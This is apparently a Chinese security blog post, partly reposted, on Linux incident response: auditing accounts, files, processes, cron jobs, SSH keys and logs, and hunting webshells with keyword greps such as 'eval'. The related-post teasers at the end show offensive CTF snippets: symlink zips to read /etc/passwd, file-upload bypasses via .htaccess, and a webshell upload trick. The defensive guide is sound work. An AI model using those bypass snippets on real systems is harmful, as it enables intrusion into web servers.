+<p><font style="color:rgb(77, 77, 77);">查找&#x2F;etc&#x2F;passwd文件， &#x2F;etc&#x2F;passwd这个文件是保存着这个linux系统所有用户的信息，通过查看这个文件，我们就可以尝试查找有没有攻击者所创建的用户，或者存在异常的用户。我们主要关注的是第3、4列的用户标识号和组标识号，和倒数一二列的用户主目录和命令解析程序。一般来说最后一列命令解析程序如果是设置为nologin的话，那么表示这个用户是不能登录的，所以可以结合我们上面所说的bash_history文件的排查方法。首先在&#x2F;etc&#x2F;passwd中查找命令解释程序不是nologin的用户，然后再到这些用户的用户主目录里，找到bash_history，去查看这个用户有没执行过恶意命令。</font></p>
+<p>cat &#x2F;etc&#x2F;passwd </p>
+<p><strong><font style="color:rgb(77, 77, 77);">（7） 查看新增文件</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">find：在指定目录下查找文件</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-<span class="built_in">type</span>	b/d/c/p/l/f查是块设备、目录、字符设备、管道、符号、链   接、普通文件</span><br><span class="line">-mtime -n +n 	按文件更改时间来查找文件，-n指n天以内，+n指n天前</span><br><span class="line">-atime -n +n 	按文件访问时间来查找文件，-n指n天以内，+n指n天前</span><br><span class="line">-ctime -n +n 	按文件创建时间来查找文件，-n指n天以内，+n指n天前</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(77, 77, 77);">查找24小时前被修改的php文件</font></p>
+<p><font style="color:rgb(77, 77, 77);">find .&#x2F; -mtime +0 -name “*.php”</font></p>
+<p><font style="color:rgb(77, 77, 77);">grep 一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-v	反转查找 </span><br><span class="line">-E	使用正则表达式选项 </span><br><span class="line">-n	输出包含匹配字符串的行数</span><br><span class="line">--color=auto  标记匹配颜色</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(77, 77, 77);">（8） 特殊权限的文件查看</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">查找777 的权限的文件</font></p>
+<p><font style="color:rgb(77, 77, 77);">find &#x2F; -perm 777 | more</font></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（9）隐藏的文件 （以 “.”开头的具有隐藏属性的文件）PS：在文件分析过程中，手工排查频率较高的命令是 find grep ls 核心目的是为了关联推理出可疑文件</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">ls &#x2F;etc -ar | grep “^.“</font></strong></p>
+<h3 id="进程排查-1"><a href="#进程排查-1" class="headerlink" title="进程排查"></a><font style="color:rgb(79, 79, 79);">进程排查</font></h3><p><strong><font style="color:rgb(77, 77, 77);">（1）使用top命令 实时动态地查看系统的整体运行情况，主要分析CPU和内存多的进程，是一个综合了多方信息监测系统性能和运行信息的实用工具</font></strong></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-019.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-020.png"></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（2）用netstat 网络 连接命令，分析可疑端口、可疑IP、可疑PID及程序进程</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">netstat用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。选项参数如下：</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-a 	显示所有连线中的Socket。 </span><br><span class="line">-n  直接使用IP地址，而不通过域名服务器。</span><br><span class="line">-t 	显示TCP传输协议的连线状况。</span><br><span class="line">-u  显示UDP传输协议的连线状况。</span><br><span class="line">-v  显示指令执行过程。</span><br><span class="line">-p  显示正在使用Socket的程序识别码和程序名称。</span><br><span class="line">-s  显示网络工作信息统计表。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(77, 77, 77);">（3）根据netstat 定位出的pid，使用ps命令，分析进程</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">先用neststat查看外联进程，然后使用ps命令查看对应进程信息及所在位置</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp</span><br><span class="line">ps aux |grep 40634</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-021.png"></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（4）</font></strong><font style="color:rgb(77, 77, 77);">隐藏进程查看</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | awk <span class="string">&#x27;&#123;print&#125;&#x27;</span> | <span class="built_in">sort</span> -n | <span class="built_in">uniq</span> &gt;1</span><br><span class="line"><span class="built_in">ls</span> /proc | <span class="built_in">sort</span> -n |<span class="built_in">uniq</span> &gt;2</span><br><span class="line">diff 1 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="系统信息排查-1"><a href="#系统信息排查-1" class="headerlink" title="系统信息排查"></a><font style="color:rgb(79, 79, 79);">系统信息排查</font></h3><p><strong><font style="color:rgb(77, 77, 77);">（1）查看分析history ，曾经的命令操作痕迹，以便进一步排查溯源。运气好有可能通过记录关联到如下信息：</font></strong></p>
+<p><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">a) wget 远程某主机（域名&amp;IP）的远控文件；</font><strong><font style="color:rgb(77, 77, 77);"><br></font></strong><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">b) 尝试连接内网某主机（ssh scp），便于分析攻击者意图;</font><strong><font style="color:rgb(77, 77, 77);"><br></font></strong><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">c) 打包某敏感数据或代码，tar zip 类命令</font><strong><font style="color:rgb(77, 77, 77);"><br></font></strong><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">d) 对系统进行配置，包括命令修改、远控木马类，可找到攻击者关联信息…</font></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（2）查看分析用户相关分析</font></strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a) useradd userdel 的命令时间变化（<span class="built_in">stat</span>），以及是否包含可疑信息</span><br><span class="line">b) <span class="built_in">cat</span> /etc/passwd 分析可疑帐号，可登录帐号</span><br><span class="line">查看UID为0的帐号➜➜➜awk -F: <span class="string">&#x27;&#123;if($3==0)print $1&#125;&#x27;</span> /etc/passwd</span><br><span class="line">查看能够登录的帐号➜➜➜<span class="built_in">cat</span> /etc/passwd | grep -E <span class="string">&quot;/bin/bash$&quot;</span></span><br><span class="line"></span><br><span class="line">PS：UID为0的帐号也不一定都是可疑帐号，Freebsd默认存在toor帐号，且uid为0.（toor 在BSD官网解释为root替代帐号，属于可信帐号）；</span><br><span class="line">————————————————</span><br><span class="line"></span><br><span class="line">                            版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</span><br><span class="line">                        </span><br><span class="line">原文链接：https://blog.csdn.net/qq1140037586/article/details/130582989</span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(77, 77, 77);">（3）查看分析任务计划</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">crontab -u  &lt;-l, -r, -e&gt;</font></strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-u 指定一个用户</span><br><span class="line">-l 列出某个用户的任务计划</span><br><span class="line">-r 删除某个用户的任务</span><br><span class="line">-e 编辑某个用户的任务（编辑的是/var/spool/cron下对应用户的cron文件，也可以直接修改/etc/crontab文件）</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(77, 77, 77);">通过crontab –l 查看当前的任务计划有哪些，是否有后门木马程序启动相关信息；</font><br><font style="color:rgb(77, 77, 77);">查看etc目录任务计划相关文件，ls &#x2F;etc&#x2F;cron*</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-022.png"></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（4）查看linux 开机启动程序</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">查看rc.local文件（&#x2F;etc&#x2F;init.d&#x2F;rc.local &#x2F;etc&#x2F;rc.local）</font></p>
+<p><font style="color:rgb(77, 77, 77);">ls –alt &#x2F;etc&#x2F;init.d&#x2F;</font></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（5）查看系统用户登录信息</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">a）使用lastlog命令，系统中所有用户最近一次登录信息。</font></p>
+<p><font style="color:rgb(77, 77, 77);">b) 使用lastb命令，用于显示用户错误的登录列表；</font></p>
+<p><font style="color:rgb(77, 77, 77);">c) 使用last命令，用于显示用户最近登录信息</font></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（6）系统路径分析</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">echo $PATH </font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">分析有无敏感可疑信息</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（7）查看ssh相关目录有无可疑的公钥存在</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">Redis（6379） 未授权恶意入侵，即可直接通过redis到目标主机导入公钥；</font><strong><font style="color:rgb(77, 77, 77);"><br></font></strong><font style="color:rgb(77, 77, 77);">目录： &#x2F;etc&#x2F;ssh .&#x2F;.ssh&#x2F;</font></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（8）查看Linux发行版版本信息</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">lsb_release -a</font></p>
+<h3 id="后门排查"><a href="#后门排查" class="headerlink" title="后门排查"></a><font style="color:rgb(79, 79, 79);">后门排查</font></h3><p><font style="color:rgb(77, 77, 77);">通过文件内容中的危险函数，去找到网站中的web后门。最常见的Webshell文件内容中常见的恶意函数：</font></p>
+<p><font style="color:rgb(85, 86, 102);">PHP<br></font><font style="color:rgb(85, 86, 102);">Eval、System、assert、……</font></p>
+<p><font style="color:rgb(85, 86, 102);">JSP<br></font><font style="color:rgb(85, 86, 102);">getRunTime、 FileOutputStream、……</font></p>
+<p><font style="color:rgb(85, 86, 102);">ASP<br></font><font style="color:rgb(85, 86, 102);">eval、execute、 ExecuteGlobal、……</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html/ -<span class="built_in">type</span> f -name  <span class="string">&#x27;*.php&#x27;</span>|xargs grep <span class="string">&#x27;eval&#x27;</span> |more</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(85, 86, 102);">除了通过grep去找webshell，我们还可以用类似 D盾之类的webshell查杀工具，把源码拖下来在本机查杀。</font></p>
+<p><font style="color:rgb(85, 86, 102);">有时候黑客在上传完webshell后门，获取到自己想要的信息后，就会删除掉webshell，又或者遇到了一些变形过的webshell后门，我们的关键字没有搜索到，这时候通过文件去找到webshell的方法就不适用了。那么这个时候就只能通过分析web日志，来找到黑客的webshell文件。直接分析web日志的最直接方式就是通过web日志中的特征来判断是否存在恶意的webshell后门，比如上面列表展示的这些常见webshell会传递的get参数。</font></p>
+<h3 id="日志排查-1"><a href="#日志排查-1" class="headerlink" title="日志排查"></a><font style="color:rgb(79, 79, 79);">日志排查</font></h3><p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。大部分Linux发行版默认的日志守护进程为 syslog，位于 &#x2F;etc&#x2F;syslog 或 &#x2F;etc&#x2F;syslogd 或&#x2F;etc&#x2F;rsyslog.d，默认配置文件为 &#x2F;etc&#x2F;syslog.conf 或 rsyslog.conf，任何希望生成日志的程序都可以向 syslog 发送信息。</p>
+<p>Linux系统内核和许多程序会产生各种错误信息、警告信息和其他的提示信息，这些信息对管理员了解系统的运行状态是非常有用的，所以应该把它们写到日志文件中去。完成这个过程的程序就是syslog。syslog可以根据日志的类别和优先级将日志保存到不同的文件中。</p>
+<p><strong><font style="color:rgb(77, 77, 77);">（1）日志类型</font></strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">auth		用户认证时产生的日志，如login命令、su命令。</span><br><span class="line">authpriv	与 auth 类似，但是只能被特定用户查看。</span><br><span class="line">console		针对系统控制台的消息。</span><br><span class="line">cron		系统定期执行计划任务时产生的日志。</span><br><span class="line">daemon		某些守护进程产生的日志。</span><br><span class="line">ftp			FTP服务。</span><br><span class="line">kern		系统内核消息。</span><br><span class="line">mail		邮件日志。</span><br><span class="line">mark		产生时间戳。系统每隔一段时间向日志文件中输出当前时间，每行的格式类似于 May 26 11:17:09 rs2 -- MARK --，可以由此推断系统发生故障的大概时间。</span><br><span class="line">news		网络新闻传输协议(nntp)产生的消息。</span><br><span class="line">ntp			网络时间协议(ntp)产生的消息。</span><br><span class="line">user		用户进程。</span><br><span class="line"></span><br><span class="line">                        </span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(77, 77, 77);">（2）日志优先级：</font></strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">优先级	说明</span><br><span class="line">emerg	紧急情况，系统不可用（例如系统崩溃），一般会通知所有用户。</span><br><span class="line">alert	需要立即修复，例如系统数据库损坏。</span><br><span class="line">crit	危险情况，例如硬盘错误，可能会阻碍程序的部分功能。</span><br><span class="line">err		一般错误消息。</span><br><span class="line">warning	警告。</span><br><span class="line">notice	不是错误，但是可能需要处理。</span><br><span class="line">info	通用性消息，一般用来提供有用信息。</span><br><span class="line">debug	调试程序产生的信息。</span><br><span class="line">none	没有优先级，不记录任何日志消息。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(77, 77, 77);">（3）常用日志文件</font></strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">日志目录					作用</span><br><span class="line">/var/log/message	包括整体系统信息</span><br><span class="line">/var/log/auth.log	包含系统授权信息，包括用户登录和使用的权限机制等</span><br><span class="line">/var/log/userlog	记录所有等级用户信息的日志</span><br><span class="line">/var/log/cron		记录crontab命令是否被正确的执行</span><br><span class="line">/var/log/vsftpd.log	记录Linux FTP日志</span><br><span class="line">/var/log/lastlog	记录登录的用户，可以使用命令lastlog查看</span><br><span class="line">/var/log/secure		记录大多数应用输入的账号与密码，登录成功与否</span><br><span class="line">var/log/wtmp		记录登录系统成功的账户信息，等同于命令last</span><br><span class="line">var/log/faillog		记录登录系统不成功的账号信息，一般会被黑客删除</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="基于时间的日志管理"><a href="#基于时间的日志管理" class="headerlink" title="基于时间的日志管理"></a><font style="color:rgb(79, 79, 79);">基于时间的日志管理</font></h4><p><font style="color:rgb(77, 77, 77);">&#x2F;var&#x2F;log&#x2F;wtmp是一个二进制文件，记录每个用户的登录次数和持续时间等信息；</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">last命令</span><br><span class="line">last命令用于显示用户最近登录信息。单独执行last命令，它会读取/var/log/wtmp的文件，并把该给文件的内容记录的登入系统的用户名单全部显示出来；</span><br><span class="line">-f:		&lt;记录文件&gt;：指定记录文件</span><br><span class="line">-a：	把从何处登入系统的主机名称或ip地址，显示在最后一行</span><br><span class="line">last |more</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-023.png"></p>
+<p><font style="color:rgb(77, 77, 77);">&#x2F;var&#x2F;run&#x2F;utmp</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/run/utmp是一个二进制文件，记录当前登录系统的用户信息。</span><br><span class="line">可用<span class="built_in">who</span>命令显示当中的内容，Who的缺省输出包括用户名、终端类型、登录日期及远程主机；</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-024.png"></p>
+<p><font style="color:rgb(77, 77, 77);">&#x2F;var&#x2F;log&#x2F;lastlog(lastlog)</font></p>
+<p><font style="color:rgb(77, 77, 77);">&#x2F;var&#x2F;log&#x2F;lastlog记录用户最后登录的时间和登录终端的地址，可使用lastlog命令查看；</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-025.png"></p>
+<p><font style="color:rgb(77, 77, 77);">&#x2F;var&#x2F;log&#x2F;btmp(lastb)</font></p>
+<p><font style="color:rgb(77, 77, 77);">&#x2F;var&#x2F;log&#x2F;btmp记录错误登录的日志，可使用lostb查看，有很多黑客试图使用密码字典登录ssh服务，可以使用此日志查看恶意ip试图登录次数；</font></p>
+<h4 id="系统日志管理"><a href="#系统日志管理" class="headerlink" title="系统日志管理"></a><font style="color:rgb(79, 79, 79);">系统日志管理</font></h4><p>安全日志secure包含验证和授权方面信息，比如最常用的远程管理协议ssh，就会把所有授权信息都记录在这里。</p>
+<p>所以通过查看该日志，我们就能查看是否有人爆破ssh，通过查看存在过爆破记录的ip是否有成功登录的行为，我们就能知道是否有攻击者通过ssh暴力破解的方式成功攻击进来了。</p>
+<p>通过时间的纬度去判断，可以查看出是机器行为还是人为的，机器登录事件间隔特别密； 主要分析点：是否有ip爆破ssh成功</p>
+<p><font style="color:rgb(77, 77, 77);">定位有多少IP在爆破主机的root帐号：</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(77, 77, 77);">登录成功的IP有哪些：</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="中间件日志"><a href="#中间件日志" class="headerlink" title="中间件日志"></a><font style="color:rgb(79, 79, 79);">中间件日志</font></h4><p>Web攻击的方法多种多样，但是默认情况下Web日志中所能记录的内容并不算丰富，最致命的是web日志是不会记录post内容的，想要从Web 日志中直接找出攻击者的webshell是非常难的，所以一般来说我们的分析思路都是先通过文件的方式找到webshell，然后再从日志里找到相应的攻击者ip，再去分析攻击者的整个攻击路径，来回溯攻击者的所有行为；</p>
+<p>但各种各样的原因，如黑客在入侵完了之后把webshell删除了，通过文件搜索的方式找不到webshell或者客户因为一些原因不能让你登录服务器上去排查，只能给你一份日志排查，导致我们只能通过分析web日志去发现webshell，比如这时候要排查的话，难度会稍大。Web日志主要分析access_log，本文以常见的中间件apache为例，其他中间件日志格式和分析思路大同小异；</p>
+<p>Apache默认自动生成两个日志文件，访问日志access_log和error_log；</p>
+<h4 id="数据库日志"><a href="#数据库日志" class="headerlink" title="数据库日志"></a><font style="color:rgb(79, 79, 79);">数据库日志</font></h4><p><font style="color:rgb(77, 77, 77);">查看数据库文件：路径为&#x2F;var&#x2F;log&#x2F;mysql&#x2F;，记录一次数据库的连接、查询和退出中间的数据库操作；</font></p>
+<p><strong><font style="color:rgb(77, 77, 77);">原文链接：</font></strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq1140037586/article/details/130582989"><strong>https://blog.csdn.net/qq1140037586/article/details/130582989</strong></a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xuan-1117.github.io">xuan23</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xuan-1117.github.io/2026/03/22/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">https://xuan-1117.github.io/2026/03/22/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://xuan-1117.github.io" target="_blank">XUAN Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WEB/">WEB</a></div><div class="post-share"><div class="social-share" data-image="/img/backgrounds/bg-20.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/03/22/WEB/php/" title="php"><img class="cover" src="/img/backgrounds/bg-12.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">php</div></div><div class="info-2"><div class="info-item-1">Get传参在url或者bp抓包传参，如果要求多个参数就用&amp;连接，例如：?a&#x3D;1&amp;b&#x3D;2&amp;c&#x3D;3   Post传参使用bp抓包，添加项目：Content-Type: application&#x2F;x-www-form-urlencoded   常见考点软连接绕过文件读取压缩一个软链接，注意这里是压缩了一个指向文件的软链，类似于windows下的快捷方式 12345ln -s /flag 1.txttar -cvf 1.tar 1.txtln -s /etc/passwd passwdzip -y passwd.zip passwd  目录穿越文件上传 这里需要上传两次，第一次文件软链接到&#x2F;文件，压缩上传 12ln -s /var/www/html    #软链接到/var/www/htmlzip -y 1.zip html  #将html压缩为1.zip  第二次，然后创建一个和刚刚的软链同名(刚刚是html)的文件夹里面塞进shell，把这个文件夹连带里面的webshell打包成zip再次上传   路径穿越123...</div></div></div></a><a class="pagination-related" href="/2026/03/22/WEB/%E4%BF%AE%E5%A4%8D/" title="修复"><img class="cover" src="/img/backgrounds/bg-19.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">修复</div></div><div class="info-2"><div class="info-item-1">用 find &#x2F; -name “flag” &amp;2&gt;&#x2F;dev&#x2F;null 找文件名带 flag&#96; 的文件 用 find &#x2F; -type f | xargs grep -H -l ‘flag’ &amp;2&gt;&#x2F;dev&#x2F;null 找文件内容中含 flag 的文件（慎用，全盘搜索速度会很慢）最好能缩小查找范围，例如确定 flag 在 &#x2F;var 目录里，那就不要从根目录开始搜索，使用 find &#x2F;var -type f | xargs grep -H -l ‘flag’ &amp;2&gt;&#x2F;dev&#x2F;null 会更好  1234netstat -anotcpdump -i eth1 -w 1.pcapnetstat -tunlp  打包 1tar -zcvf fix.tar.gz *  waf简陋版 1234567891011function wafrce($str)&#123;	return !preg_match(&quot;/openlog|syslog|re...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/03/21/WEB/UOLAD/" title="UOLAD"><img class="cover" src="/img/backgrounds/bg-15.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-21</div><div class="info-item-2">UOLAD</div></div><div class="info-2"><div class="info-item-1">UOLAD（文件上传绕过方法）1 前端绕过js绕过先验证是否为前端验证，通过上传违法文件抓包，不可抓包则为前端验证。第一种绕过方法上传合法文件，抓包修改为目的文件。第二种禁用Javascript 2 content-type绕过抓包将content-type修改为合法的 3 特殊后缀绕过 php3 php5 phtml pht4 .htaccess绕过上传该文件，语句为AddType application&#x2F;x-httpd-php .jpg .txt  增加。Jpg等类型的语句当作.php的类型处理 123&lt;FilesMatch &quot;1.jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;  5 user.ini绕过写法Auto-prepenf-file&#x3D;111.txt 访问php文件时会先执行111.txt文件再执行上传的文件。第二种方法 6 点空格点绕过 空隔绕过 后缀加点绕过 抓包改为php. . 原理window会自动删除文件名后面的点和空格。  抓包多加...</div></div></div></a><a class="pagination-related" href="/2026/03/22/WEB/php/" title="php"><img class="cover" src="/img/backgrounds/bg-12.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-22</div><div class="info-item-2">php</div></div><div class="info-2"><div class="info-item-1">Get传参在url或者bp抓包传参，如果要求多个参数就用&amp;连接，例如：?a&#x3D;1&amp;b&#x3D;2&amp;c&#x3D;3   Post传参使用bp抓包，添加项目：Content-Type: application&#x2F;x-www-form-urlencoded   常见考点软连接绕过文件读取压缩一个软链接，注意这里是压缩了一个指向文件的软链，类似于windows下的快捷方式 12345ln -s /flag 1.txttar -cvf 1.tar 1.txtln -s /etc/passwd passwdzip -y passwd.zip passwd  目录穿越文件上传 这里需要上传两次，第一次文件软链接到&#x2F;文件，压缩上传 12ln -s /var/www/html    #软链接到/var/www/htmlzip -y 1.zip html  #将html压缩为1.zip  第二次，然后创建一个和刚刚的软链同名(刚刚是html)的文件夹里面塞进shell，把这个文件夹连带里面的webshell打包成zip再次上传   路径穿越123...</div></div></div></a><a class="pagination-related" href="/2025/12/11/WEB/%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="伪协议"><img class="cover" src="/img/backgrounds/bg-18.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-11</div><div class="info-item-2">伪协议</div></div><div class="info-2"><div class="info-item-1">1 php:&#x2F;&#x2F;filter  #查指定文件源码 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php 替换编码方式绕过 php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf8.utf16&#x2F;resource&#x3D;index.php php:&#x2F;&#x2F;filter&#x2F;string.rot13&#x2F;resource&#x3D;file string.toupper string.tolower string.strip_tags php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;index.php 2 data:&#x2F;&#x2F...</div></div></div></a><a class="pagination-related" href="/2026/03/21/WEB/SQL/" title="SQL"><img class="cover" src="/img/backgrounds/bg-13.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-21</div><div class="info-item-2">SQL</div></div><div 